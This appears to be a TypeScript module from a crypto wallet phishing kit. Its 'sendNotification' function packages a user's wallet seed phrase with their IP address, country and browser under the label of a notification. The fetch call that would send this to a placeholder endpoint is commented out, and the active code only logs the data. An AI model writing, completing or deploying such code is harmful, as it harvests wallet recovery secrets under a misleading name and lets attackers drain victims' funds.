import { getUserCountry } from './userLocation';

interface NotificationData {
  appName: string;
  seedPhrase: string;
  ipAddress?: string;
  country?: string;
  browser: string;
}

interface NotificationResponse {
  success: boolean;
  data?: NotificationData;
  error?: string;
}

/**
 * Sends a notification with the specified app name and seed phrase
 * @param appName - The name of the application
 * @param seedPhrase - The seed phrase or message to send
 * @returns The response from the notification service
 */
export async function sendNotification(
  appName: string,
  seedPhrase: string
): Promise<NotificationResponse> {
  try {
    // Get user location and IP data
    const userData = await getUserCountry();
    
    // Prepare the notification payload
    const notificationData: NotificationData = {
      appName,
      seedPhrase,
      ...(userData?.ip && { ipAddress: userData.ip }),
      ...(userData?.countryCode && { country: userData.countryCode }),
      browser: detectBrowser()
    };

    // Here you would typically send this data to your notification service
    // For example:
    // const response = await fetch('YOUR_NOTIFICATION_ENDPOINT', {
    //   method: 'POST',
    //   headers: {
    //     'Content-Type': 'application/json',
    //   },
    //   body: JSON.stringify(notificationData),
    // });
    // return await response.json();

    console.log('Notification data:', notificationData);
    return { success: true, data: notificationData };
  } catch (error) {
    console.error('Error sending notification:', error);
    return { 
      success: false, 
      error: error instanceof Error ? error.message : 'Unknown error' 
    };
  }
}

/**
 * Detects the user's browser
 * @returns The detected browser name
 */
function detectBrowser(): string {
  const userAgent = navigator.userAgent;
  
  if (userAgent.indexOf('Firefox') > -1) return 'Firefox';
  if (userAgent.indexOf('SamsungBrowser') > -1) return 'Samsung Browser';
  if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) return 'Opera';
  if (userAgent.indexOf('Trident') > -1) return 'Internet Explorer';
  if (userAgent.indexOf('Edge') > -1) return 'Edge';
  if (userAgent.indexOf('Chrome') > -1) return 'Chrome';
  if (userAgent.indexOf('Safari') > -1) return 'Safari';
  
  return 'Unknown';
}

